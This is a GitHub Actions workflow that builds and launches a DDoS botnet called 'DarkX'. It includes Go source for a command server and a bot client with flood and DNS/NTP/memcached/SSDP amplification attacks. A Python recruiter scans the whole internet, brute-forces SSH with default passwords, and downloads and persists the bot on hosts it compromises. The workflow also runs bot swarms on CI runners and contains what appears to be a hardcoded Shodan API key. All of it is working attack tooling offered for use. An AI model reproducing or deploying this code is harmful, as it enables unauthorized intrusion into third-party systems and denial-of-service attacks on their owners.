name: DarkX Botnet
on:
  workflow_dispatch:
    inputs:
      power:
        description: 'Attack Power'
        required: true
        default: '1gb'
        type: choice
        options:
        - '100mb'
        - '1gb'
        - '10gb'
        - '100gb'
        - '1tb'
      recruitment:
        description: 'Auto-Recruitment'
        required: true
        default: 'aggressive'
        type: choice
        options:
        - 'passive'
        - 'active'
        - 'aggressive'
        - 'bruteforce'

jobs:
  deploy-darkx:
    runs-on: ubuntu-latest
    timeout-minutes: 3600

    steps:
    - name: Checkout repository
      uses: actions/checkout@v4
      
    - name: Setup DarkX Environment
      run: |
        mkdir -p darkx && cd darkx
        echo "Installing dependencies..."
        sudo apt update && sudo apt install -y golang-go git curl wget python3 python3-pip nmap masscan hydra
        pip3 install shodan requests paramiko

    - name: Create DarkX CNC Server
      run: |
        cd darkx
        cat > cnc.go << 'EOF'
        package main

        import (
            "bufio"
            "fmt"
            "log"
            "net"
            "os"
            "os/exec"
            "runtime"
            "strconv"
            "strings"
            "sync"
            "time"
        )

        var (
            bots   []net.Conn
            botMux sync.Mutex
        )

        func clearScreen() {
            if runtime.GOOS == "windows" {
                cmd := exec.Command("cmd", "/c", "cls")
                cmd.Stdout = os.Stdout
                cmd.Run()
            } else {
                cmd := exec.Command("clear")
                cmd.Stdout = os.Stdout
                cmd.Run()
            }
        }

        func showBanner() {
            fmt.Print("\033[1;31m")
            fmt.Println(`
 ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
 ▓████████████████████████████████████████████████████████████████████████████████████████████████▓ 
 ▓█████████████████████████████████████▓▓▓▓▓▓█████████████████████████████████████████████████████▓ 
 ▓████████████████████████████████████████████████████████████████████████████████████████████████▓ 
 ▓████████████████████████████████████▓▓▓▓▓▓▓▓▓█████▓▓▓▓▓▓▓███████████████████████████████████████▓ 
 ▓█████████████████████████████████▓▓▓▓▓█▓▓▓▓▓▓▓▓▓▓▓████▓▓▓▓▓▓▓███████████████████████████████████▓ 
 ▓████████████████████████████████▓▓▓▓██████████▓█▓▓▓▓▓▓▓███▓▓▓▓██████████████████████████████████▓ 
 ▓████████████████████████████████▓▓███▓██████▓███████████▓███▓▓██████████████████████████████████▓ 
 ▓███████████████████████████████▓▓█████▓█▓████▓█▓██▓██▓██████▓▓▓█████████████████████████████████▓ 
 ▓████████████████████████████▓██▓▓██▓██████▓██████▓█████▓██▓█▓▓▓█████████████████████████████████▓ 
 ▓███████████████████████████▓██▓▓▓▓▓▓▓▓▓▓▓███▓█▓████▓█▓▓█▓▓▓▓▓▓▓▒██▓█████████████████████████████▓ 
 ▓████████████████████████▓▓▓▓███████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████▓█████████████████████████████▓ 
 ▓█████████████████████▓▓▓██████████████████████████████████████████▓▓▓▓▓▓████████████████████████▓ 
 ▓██████████████████████████▓██████████████████████████████████████████████▓▓█████████████████████▓ 
 ▓███████████████████▓▓▓▓▓▓▓▓▓███████████████████████████████████████▓▓▓▓█████████████████████████▓ 
 ▓██████████████████▓▒▓▓▓█▓█▓▓▓▓▓▓▓███████████████████████████████▓▓▓▓▓▓▓▓▓▓▓▓████████████████████▓ 
 ▓█████████████████████▓▓▓▓▓▓▓█▓▓▓▓▓▓▓▓▓▓▓▓▓██████████████▓▓▓▓▓▓▓▓▓▓▓███▓▓▓▓▓▓████████████████████▓ 
 ▓█████████████████▓▓███████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓▓▓▓▓▓▓▓▓▓▓▓▓███▓▓█████████████████▓ 
 ▓███████████████▓████▓▓▓▓▓████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▓███████▓▓███████████████████▓ 
 ▓█████████████████████████▓████████████████████████████████████████████▓▓▓▓██████████████████████▓ 
 ▓█████████████████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██▓██████████████████████████▓ 
 ▓████████████████████████▓███████████░░░░░░░░░░████░░░░░░░░░███░░░░░██▓██████████████████████████▓ 
 ▓███████████████████████████████████░░░░░░░░░░██████░░░░░░░█████░░░░██▓██████████████████████████▓ 
 ▓█████████████████████████▓█████████░░░░░░░░░▓██████░░░░░░░█████░░░░██▓██████████████████████████▓ 
 ▓█████████████████████████▓█████████░░░░░░░░░░█████▓░░░░░░░█████░░░░█████████████████████████████▓ 
 ▓█████████████████████████▓█████████░░░░░░░░░░░███░░░░░░░░░░███░░░░██▓███████████████████████████▓ 
 ▓██████████████████████████▓█████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██████████████████████████████▓ 
 ▓███████████████████████████▓████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██▓████████████████████████████▓ 
 ▓███████████████████████████▓▒▓███████░░░░░░░░░░░░░░░░░░░░░░░░░░███▓█████████████████████████████▓ 
 ▓█████████████████████████▓█████████▓███░░░░░░░░░░░░░░░░░░░░░░░███▓██████████████████████████████▓ 
 ▓████████████████████████▓███▓▓████████████░░░░░░░░░░░░░░░░░█████▓▓██████████████████████████████▓ 
 ▓███████████████████████▓██████████████████████░░░░░░░░▓███████████▓█████████████████████████████▓ 
 ▓███████████████████████▓██▓▓████▓▓▓▓▓███████████████████████████▓███████████████████████████████▓ 
 ▓██████████████████████▓▓█████████████▓▓▓███████████████████████▓▓██▓▓███████████████████████████▓ 
 ▓████████████████████▓▓████▓▓███▓█████████████████████████████████████▓▓█████████████████████████▓ 
 ▓█████████████████████████████████████████████████▓▓█████▓██████████████▓▓███████████████████████▓ 
 ▓████████████████████████████████████████████████████████████████████████▓███████████████████████▓ 
 ▓████████████████████████████████████████████████████████████████████████████████████████████████▓ 
 ▓████████████████████████████████████████████████████████████████████████████████████████████████▓ 
 ▓████████████████████████████████████████████████████████████████████████████████████████████████▓ 
 ▓████████████████████████████████████████████████████████████████████████████████████████████████▓ 
 ▓███████████████████████░░░░░░███████████████████████░░░███████░░░█████░░░███████████████████████▓ 
 ▓███████████████████████░░░░░░░░░████████████████████▓░░████████░░░███░░░████████████████████████▓ 
 ▓███████████████████████░░██████░░░██░░░░░░███░░░█░░██░░██▒░░░███░░░▓░░██████████████████████████▓ 
 ▓███████████████████████░░██████░░░██░████░░▓█▒░░░█▓██░░█░░░███████░░░███████████████████████████▓ 
 ▓███████████████████████░░██████░░░██▓░░░░░░██▒░░█████░░░░░███████░░░░░██████████████████████████▓ 
 ▓███████████████████████░░████░░░░██░░████░░██▒░░█████░░█░░░████░░░██░░░█████████████████████████▓ 
 ▓███████████████████████░░░░░░░░████░░░░░░░░░█░░░████░░░██▓░░░█░░░████░░░░███████████████████████▓ 
 ▓████████████████████████████████████████████████████████████████████████████████████████████████▓ 
 ▓████████████████████████████████████████████████████████████████████████████████████████████████▓ 
 ▓████████████████████████████████████████████████████████████████████████████████████████████████▓ 
 ▓████████████████████████████████████████████████████████████████████████████████████████████████▓ 
 ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
            `)
            fmt.Print("\033[1;37m")
            fmt.Println("                           D A R K X   B O T N E T   C O N T R O L")
            fmt.Print("\033[1;31m")
            fmt.Println("                                 [Version 2.0] [Black & Red Edition]")
            fmt.Print("\033[0m")
        }

        func main() {
            clearScreen()
            showBanner()
            go startUserServer()
            startBotServer()
        }

        func startUserServer() {
            listener, err := net.Listen("tcp", ":5555")
            if err != nil {
                log.Fatal("Failed to start user server:", err)
            }
            defer listener.Close()
            
            log.Println("User server started on :5555")
            for {
                conn, err := listener.Accept()
                if err != nil {
                    log.Println("Accept error:", err)
                    continue
                }
                go handleUser(conn)
            }
        }

        func startBotServer() {
            listener, err := net.Listen("tcp", ":4444")
            if err != nil {
                log.Fatal("Failed to start bot server:", err)
            }
            defer listener.Close()
            
            log.Println("Bot server started on :4444")
            for {
                conn, err := listener.Accept()
                if err != nil {
                    log.Println("Accept error:", err)
                    continue
                }
                botMux.Lock()
                bots = append(bots, conn)
                count := len(bots)
                botMux.Unlock()
                log.Printf("Bot connected: %s (Total: %d)", conn.RemoteAddr(), count)
            }
        }

        func handleUser(conn net.Conn) {
            defer conn.Close()
            
            reader := bufio.NewReader(conn)
            
            showBanner()
            conn.Write([]byte("\033[1;31m\n                    ════════════════════════════════════════════════\033[0m\r\n"))
            conn.Write([]byte("\033[1;37m                    🔐  A U T H E N T I C A T I O N   R E Q U I R E D  🔐\033[0m\r\n"))
            conn.Write([]byte("\033[1;31m                    ════════════════════════════════════════════════\033[0m\r\n\n"))
            
            conn.Write([]byte("\033[1;31m[USERNAME]\033[1;37m: \033[0m"))
            username, err := reader.ReadString('\n')
            if err != nil {
                return
            }
            
            conn.Write([]byte("\033[1;31m[PASSWORD]\033[1;37m: \033[0m"))
            password, err := reader.ReadString('\n')
            if err != nil {
                return
            }
            
            username = strings.TrimSpace(username)
            password = strings.TrimSpace(password)
            
            if username == "admin" && password == "admin" {
                conn.Write([]byte("\033[1;32m\n✅ Authentication Successful! Welcome to DarkX.\033[0m\r\n"))
                time.Sleep(1 * time.Second)
                showDashboard(conn)
            } else {
                conn.Write([]byte("\033[1;31m\n❌ Access Denied! Use: admin / admin\033[0m\r\n"))
            }
        }

        func showDashboard(conn net.Conn) {
            reader := bufio.NewReader(conn)
            
            for {
                botMux.Lock()
                botCount := len(bots)
                botMux.Unlock()
                
                clearScreen()
                showBanner()
                
                conn.Write([]byte("\033[1;31m\n                    ════════════════════════════════════════════════\033[0m\r\n"))
                conn.Write([]byte(fmt.Sprintf("\033[1;37m                    🤖  BOTS ONLINE: \033[1;32m%d\033[1;37m  |  ⚡ POWER: MAXIMUM  🤖\033[0m\r\n", botCount)))
                conn.Write([]byte("\033[1;31m                    ════════════════════════════════════════════════\033[0m\r\n\n"))
                
                conn.Write([]byte("\033[1;31m[ DARKX ]\033[1;37m# \033[0m"))
                command, err := reader.ReadString('\n')
                if err != nil {
                    return
                }
                
                command = strings.TrimSpace(command)
                parts := strings.Fields(command)
                
                if len(parts) == 0 {
                    continue
                }
                
                switch parts[0] {
                case "help", "?":
                    conn.Write([]byte("\033[1;31m" + `
╔══════════════════════════════════════════════════╗
║                 DARKX COMMANDS                   ║
╠══════════════════════════════════════════════════╣
║ bots        - Show connected bots               ║
║ attack      - Launch attack                     ║
║ methods     - Show attack methods               ║
║ recruit     - Start auto-recruitment            ║
║ clear       - Clear screen                      ║
║ exit        - Logout                            ║
╚══════════════════════════════════════════════════╝
` + "\033[0m\r\n"))
                case "bots":
                    botMux.Lock()
                    count := len(bots)
                    botMux.Unlock()
                    conn.Write([]byte(fmt.Sprintf("\033[1;32m[+] Bots Online: %d\033[0m\r\n", count)))
                case "attack":
                    if len(parts) >= 5 {
                        method, target, port, duration := parts[1], parts[2], parts[3], parts[4]
                        conn.Write([]byte(fmt.Sprintf("\033[1;32m[+] Attack Launched: %s -> %s:%s for %s seconds\033[0m\r\n", method, target, port, duration)))
                        
                        botMux.Lock()
                        for _, bot := range bots {
                            bot.Write([]byte(fmt.Sprintf("%s %s %s %s\n", method, target, port, duration)))
                        }
                        botMux.Unlock()
                    } else {
                        conn.Write([]byte("\033[1;31m[-] Usage: attack <method> <target> <port> <duration>\033[0m\r\n"))
                    }
                case "methods":
                    conn.Write([]byte("\033[1;31m" + `
╔══════════════════════════════════════════════════╗
║                ATTACK METHODS                    ║
╠══════════════════════════════════════════════════╣
║ UDP        - UDP flood attack                   ║
║ TCP        - TCP connection flood               ║
║ SYN        - SYN flood                          ║
║ HTTP       - HTTP/HTTPS flood                   ║
║ DNS        - DNS amplification                  ║
║ NTP        - NTP amplification                  ║
║ MEM        - Memcached amplification            ║
║ SSDP       - SSDP amplification                 ║
║ GAME       - Game server flood                  ║
║ DESTROY    - Combined maximum power             ║
╚══════════════════════════════════════════════════╝
` + "\033[0m\r\n"))
                case "recruit":
                    conn.Write([]byte("\033[1;32m[+] Starting auto-recruitment...\033[0m\r\n"))
                    go startRecruitment()
                case "clear":
                    clearScreen()
                    showBanner()
                case "exit":
                    conn.Write([]byte("\033[1;31m[!] Logging out... Goodbye!\033[0m\r\n"))
                    return
                default:
                    conn.Write([]byte("\033[1;31m[-] Unknown command. Type 'help' for commands.\033[0m\r\n"))
                }
                
                time.Sleep(1 * time.Second)
            }
        }

        func startRecruitment() {
            log.Println("Starting recruitment process...")
        }
EOF

    - name: Create DarkX Bot Client
      run: |
        cd darkx
        cat > bot.go << 'EOF'
        package main

        import (
            "bufio"
            "crypto/tls"
            "fmt"
            "net"
            "net/http"
            "os/exec"
            "runtime"
            "strconv"
            "strings"
            "time"
        )

        var CNC_IP = "CNC_IP_PLACEHOLDER"

        func main() {
            if runtime.GOOS == "linux" {
                exec.Command("sh", "-c", "(crontab -l 2>/dev/null; echo \"@reboot sleep 60 && curl -s http://RAW_IP/bot_x64 -o /tmp/.systemd && chmod +x /tmp/.systemd && /tmp/.systemd &\") | crontab -").Run()
            }
            
            for {
                conn, err := net.Dial("tcp", CNC_IP + ":4444")
                if err == nil {
                    fmt.Println("Connected to DarkX CNC")
                    handleCNC(conn)
                    conn.Close()
                } else {
                    fmt.Printf("Failed to connect: %v\n", err)
                }
                time.Sleep(10 * time.Second)
            }
        }

        func handleCNC(conn net.Conn) {
            scanner := bufio.NewScanner(conn)
            for scanner.Scan() {
                cmd := scanner.Text()
                parts := strings.Fields(cmd)
                if len(parts) < 4 { continue }
                
                method, target, portStr, durationStr := parts[0], parts[1], parts[2], parts[3]
                port, _ := strconv.Atoi(portStr)
                duration, _ := strconv.Atoi(durationStr)
                
                fmt.Printf("Executing attack: %s on %s:%d for %d seconds\n", method, target, port, duration)
                go launchAttack(method, target, port, duration)
            }
        }

        func launchAttack(method, target string, port, duration int) {
            end := time.Now().Add(time.Duration(duration) * time.Second)
            workers := 500
            
            switch strings.ToUpper(method) {
            case "UDP":
                go udpFlood(target, port, end, workers)
            case "TCP":
                go tcpFlood(target, port, end, workers)
            case "SYN":
                go synFlood(target, port, end, workers)
            case "HTTP":
                go httpFlood(target, port, end, workers)
            case "DNS":
                go dnsAmplification(target, port, end)
            case "NTP":
                go ntpAmplification(target, port, end)
            case "MEM":
                go memcachedAmplification(target, port, end)
            case "SSDP":
                go ssdpAmplification(target, port, end)
            case "GAME":
                go gameFlood(target, port, end, workers)
            case "DESTROY":
                go destroyMode(target, port, end, workers)
            }
        }

        func udpFlood(target string, port int, end time.Time, workers int) {
            for i := 0; i < workers; i++ {
                go func() {
                    for time.Now().Before(end) {
                        conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
                        if err == nil {
                            conn.Write(make([]byte, 65507))
                            conn.Close()
                        }
                    }
                }()
            }
        }

        func tcpFlood(target string, port int, end time.Time, workers int) {
            for i := 0; i < workers; i++ {
                go func() {
                    for time.Now().Before(end) {
                        conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", target, port))
                        if err == nil {
                            for i := 0; i < 20 && time.Now().Before(end); i++ {
                                conn.Write(make([]byte, 1460))
                            }
                            conn.Close()
                        }
                    }
                }()
            }
        }

        func synFlood(target string, port int, end time.Time, workers int) {
            for i := 0; i < workers; i++ {
                go func() {
                    for time.Now().Before(end) {
                        net.Dial("tcp", fmt.Sprintf("%s:%d", target, port))
                    }
                }()
            }
        }

        func httpFlood(target string, port int, end time.Time, workers int) {
            tr := &http.Transport{
                TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
            }
            client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
            
            for i := 0; i < workers; i++ {
                go func() {
                    for time.Now().Before(end) {
                        url := fmt.Sprintf("http://%s:%d/", target, port)
                        req, _ := http.NewRequest("GET", url, nil)
                        req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                        client.Do(req)
                    }
                }()
            }
        }

        func dnsAmplification(target string, port int, end time.Time) {
            payload := []byte{0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x69, 0x73, 0x63, 0x03, 0x6f, 0x72, 0x67, 0x00, 0x00, 0x01, 0x00, 0x01}
            for time.Now().Before(end) {
                conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
                conn.Write(payload)
                conn.Close()
            }
        }

        func ntpAmplification(target string, port int, end time.Time) {
            payload := []byte{0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00}
            for time.Now().Before(end) {
                conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
                conn.Write(payload)
                conn.Close()
            }
        }

        func memcachedAmplification(target string, port int, end time.Time) {
            payload := []byte("\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n")
            for time.Now().Before(end) {
                conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
                conn.Write(payload)
                conn.Close()
            }
        }

        func ssdpAmplification(target string, port int, end time.Time) {
            payload := []byte("M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\nMan: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n")
            for time.Now().Before(end) {
                conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
                conn.Write(payload)
                conn.Close()
            }
        }

        func gameFlood(target string, port int, end time.Time, workers int) {
            for i := 0; i < workers; i++ {
                go func() {
                    for time.Now().Before(end) {
                        conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
                        conn.Write([]byte{0xFF, 0xFF, 0xFF, 0xFF, 0x54, 0x53, 0x6F, 0x75, 0x72, 0x63, 0x65, 0x20, 0x45, 0x6E, 0x67, 0x69, 0x6E, 0x65, 0x20, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00})
                        conn.Close()
                    }
                }()
            }
        }

        func destroyMode(target string, port int, end time.Time, workers int) {
            go udpFlood(target, port, end, workers/3)
            go tcpFlood(target, port, end, workers/3)
            go httpFlood(target, port, end, workers/3)
        }
EOF

    - name: Build DarkX Components
      run: |
        cd darkx
        go build -o cnc cnc.go
        GOOS=linux GOARCH=amd64 go build -o bot_x64 bot.go
        GOOS=linux GOARCH=386 go build -o bot_x86 bot.go
        GOOS=linux GOARCH=arm64 go build -o bot_arm64 bot.go
        GOOS=linux GOARCH=arm GOARM=7 go build -o bot_arm7 bot.go
        echo "✅ DarkX Build Complete"

    - name: Create Recruitment System
      run: |
        cd darkx
        cat > recruiter.py << 'EOF'
        import shodan
        import paramiko
        import threading
        import time
        import subprocess
        import sys
        import os

        SHODAN_API_KEY = os.getenv('SHODAN_API_KEY', '7PTl6ZKB1dFHrFAmVKoXWsboFCbCrAfY')
        CNC_IP = "CNC_IP_PLACEHOLDER"

        DEFAULT_CREDS = [
            ("root", "root"), ("admin", "admin"), ("admin", "password"), 
            ("admin", "1234"), ("admin", "default"), ("root", "1234"), 
            ("root", "default"), ("user", "user"), ("support", "support"),
            ("guest", "guest"), ("ubnt", "ubnt"), ("tech", "tech"),
            ("operator", "operator")
        ]

        def shodan_scan():
            try:
                api = shodan.Shodan(SHODAN_API_KEY)
                targets = []
                
                queries = [
                    'port:22 product:"OpenSSH"',
                    'port:23 product:"telnet"',
                    'port:80 title:"router"',
                    'port:443 "MikroTik"',
                    'port:8080 "camera"',
                    'port:21 "ftp"'
                ]
                
                for query in queries:
                    try:
                        results = api.search(query)
                        for result in results['matches']:
                            targets.append((result['ip_str'], result['port']))
                            print(f"Found: {result['ip_str']}:{result['port']}")
                    except Exception as e:
                        print(f"Query error: {e}")
                
                return targets
            except Exception as e:
                print(f"Shodan error: {e}")
                return []

        def brute_force_ssh(ip, port):
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            for username, password in DEFAULT_CREDS:
                try:
                    print(f"Trying {username}:{password} on {ip}:{port}")
                    client.connect(ip, port=port, username=username, password=password, timeout=10)
                    print(f"✅ SUCCESS: {ip}:{port} - {username}:{password}")
                    
                    stdin, stdout, stderr = client.exec_command("uname -m")
                    arch = stdout.read().decode().strip().lower()
                    
                    if "aarch64" in arch or "arm64" in arch:
                        bot_url = f"http://{CNC_IP}:8000/bot_arm64"
                    elif "arm" in arch:
                        bot_url = f"http://{CNC_IP}:8000/bot_arm7"
                    elif "x86_64" in arch or "amd64" in arch:
                        bot_url = f"http://{CNC_IP}:8000/bot_x64"
                    else:
                        bot_url = f"http://{CNC_IP}:8000/bot_x86"
                    
                    commands = [
                        f"wget -q -O /tmp/.systemd {bot_url} || curl -s -o /tmp/.systemd {bot_url}",
                        "chmod +x /tmp/.systemd",
                        "nohup /tmp/.systemd > /dev/null 2>&1 &",
                        "echo '@reboot /tmp/.systemd' | crontab - 2>/dev/null || true"
                    ]
                    
                    for cmd in commands:
                        stdin, stdout, stderr = client.exec_command(cmd)
                        stdout.read()
                    
                    client.close()
                    return True
                    
                except Exception as e:
                    continue
            
            return False

        def network_scan():
            try:
                cmd = "masscan 0.0.0.0/0 -p22,23,80,443,8080 --max-rate 1000 -oG masscan.txt 2>/dev/null"
                subprocess.run(cmd, shell=True, timeout=300)
                
                targets = []
                with open('masscan.txt', 'r') as f:
                    for line in f:
                        if 'Ports:' in line:
                            parts = line.split()
                            ip = parts[1]
                            port = parts[4].split('/')[0]
                            targets.append((ip, int(port)))
                
                return targets
            except:
                return []

        def main():
            print("🕶️ Starting DarkX Recruitment...")
            
            shodan_targets = shodan_scan()
            print(f"🎯 Shodan found {len(shodan_targets)} targets")
            
            network_targets = network_scan()
            print(f"🌐 Network scan found {len(network_targets)} targets")
            
            all_targets = shodan_targets + network_targets
            print(f"🚀 Total targets: {len(all_targets)}")
            
            successful = 0
            threads = []
            
            for ip, port in all_targets[:100]:
                t = threading.Thread(target=brute_force_ssh, args=(ip, port))
                threads.append(t)
                t.start()
                time.sleep(0.3)
            
            for t in threads:
                t.join()
            
            print(f"✅ Successfully recruited {successful} new bots")

        if __name__ == "__main__":
            main()
EOF

    - name: Setup Tailscale VPN
      run: |
        curl -fsSL https://tailscale.com/install.sh | sh
        sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=darkx-${{ github.run_id }}
        echo "TAILSCALE_IP=$(tailscale ip -4)" >> $GITHUB_ENV

    - name: Update Configuration with Real IP
      run: |
        cd darkx
        sed -i "s/CNC_IP_PLACEHOLDER/${{ env.TAILSCALE_IP }}/g" bot.go
        sed -i "s/CNC_IP_PLACEHOLDER/${{ env.TAILSCALE_IP }}/g" recruiter.py
        GOOS=linux GOARCH=amd64 go build -o bot_x64 bot.go
        echo "✅ Configuration updated with CNC IP: ${{ env.TAILSCALE_IP }}"

    - name: Start DarkX Services
      run: |
        cd darkx
        nohup ./cnc > cnc.log 2>&1 &
        echo "CNC_PID=$!" >> $GITHUB_ENV
        
        python3 -m http.server 8000 > http.log 2>&1 &
        echo "HTTP_PID=$!" >> $GITHUB_ENV
        
        sleep 5
        echo "✅ DarkX services started"

    - name: Verify CNC is Running
      run: |
        echo "Checking CNC status..."
        if ps -p $CNC_PID > /dev/null; then
          echo "✅ CNC is running (PID: $CNC_PID)"
          tail -5 darkx/cnc.log
        else
          echo "❌ CNC failed to start"
          cat darkx/cnc.log
          exit 1
        fi

    - name: Deploy Initial Bot Army
      run: |
        cd darkx
        
        case "${{ github.event.inputs.power }}" in
          "100mb") BOTS=100 ;;
          "1gb") BOTS=500 ;;
          "10gb") BOTS=1000 ;;
          "100gb") BOTS=2000 ;;
          "1tb") BOTS=5000 ;;
        esac
        
        echo "Deploying $BOTS initial bots..."
        for i in $(seq 1 $BOTS); do
          nohup ./bot_x64 > /dev/null 2>&1 &
        done
        
        echo "BOTS_DEPLOYED=$BOTS" >> $GITHUB_ENV
        echo "✅ Initial bot army deployed: $BOTS bots"

    - name: Start Auto-Recruitment
      env:
        SHODAN_API_KEY: ${{ secrets.SHODAN_API_KEY }}
      run: |
        cd darkx
        
        case "${{ github.event.inputs.recruitment }}" in
          "passive")
            echo "Starting passive recruitment (Shodan only)"
            python3 recruiter.py > recruitment.log 2>&1 &
            ;;
          "active")
            echo "Starting active recruitment (Shodan + Network)"
            python3 recruiter.py > recruitment.log 2>&1 &
            ;;
          "aggressive")
            echo "Starting aggressive recruitment (continuous)"
            while true; do
              python3 recruiter.py >> recruitment.log 2>&1
              sleep 300
            done &
            ;;
          "bruteforce")
            echo "Starting brute force recruitment (maximum)"
            for i in {1..5}; do
              python3 recruiter.py >> recruitment.log 2>&1 &
            done
            ;;
        esac
        
        echo "RECRUITMENT_PID=$!" >> $GITHUB_ENV
        echo "✅ Auto-recruitment started in ${{ github.event.inputs.recruitment }} mode"

    - name: Display DarkX Status
      run: |
        echo ""
        echo -e "\033[1;31m"
        echo "╔══════════════════════════════════════════════════════════════╗"
        echo "║                     D A R K X   B O T N E T                  ║"
        echo "╠══════════════════════════════════════════════════════════════╣"
        echo "║  \033[1;37mPower Level:    ${{ github.event.inputs.power }}\033[1;31m"
        echo "║  \033[1;37mRecruitment:    ${{ github.event.inputs.recruitment }}\033[1;31m"
        echo "║  \033[1;37mDarkX CNC IP:   ${{ env.TAILSCALE_IP }}\033[1;31m"
        echo "║  \033[1;37mBots Deployed:  ${{ env.BOTS_DEPLOYED }}\033[1;31m"
        echo "║  \033[1;37mUser Port:      5555\033[1;31m"
        echo "║  \033[1;37mBot Port:       4444\033[1;31m"
        echo "╠══════════════════════════════════════════════════════════════╣"
        echo "║  \033[1;32m🔑 Login: admin / admin\033[1;31m"
        echo "║  \033[1;36m📡 Connect: telnet ${{ env.TAILSCALE_IP }} 5555\033[1;31m"
        echo "║  \033[1;33m⚡ Methods: 10+ Powerful Attack Vectors\033[1;31m"
        echo "║  \033[1;35m🚀 Features: Auto-Recruitment + Persistence\033[1;31m"
        echo "║  \033[1;31m💀 DESTROY: Combined Maximum Power Attack\033[1;31m"
        echo "╚══════════════════════════════════════════════════════════════╝"
        echo -e "\033[0m"
        echo ""

    - name: Maintain DarkX System
      run: |
        while true; do
          if ! ps -p $CNC_PID > /dev/null 2>&1; then
            echo "🔄 Restarting DarkX CNC..."
            cd darkx
            nohup ./cnc > cnc_restart.log 2>&1 &
            CNC_PID=$!
          fi
          
          CURRENT_BOTS=$(ps aux | grep bot | grep -v grep | wc -l)
          REQUIRED_BOTS=$((BOTS_DEPLOYED / 2))
          if [ $CURRENT_BOTS -lt $REQUIRED_BOTS ]; then
            echo "➕ Deploying additional bots..."
            cd darkx
            for i in $(seq 1 100); do
              nohup ./bot_x64 > /dev/null 2>&1 &
            done
          fi
          
          CONNECTED_BOTS=$(netstat -an 2>/dev/null | grep :4444 | grep ESTABLISHED | wc -l)
          echo "[$(date)] 🕶️ DarkX Status | Connected: $CONNECTED_BOTS | Total: $CURRENT_BOTS | Mode: ${{ github.event.inputs.recruitment }}"
          sleep 30
        done
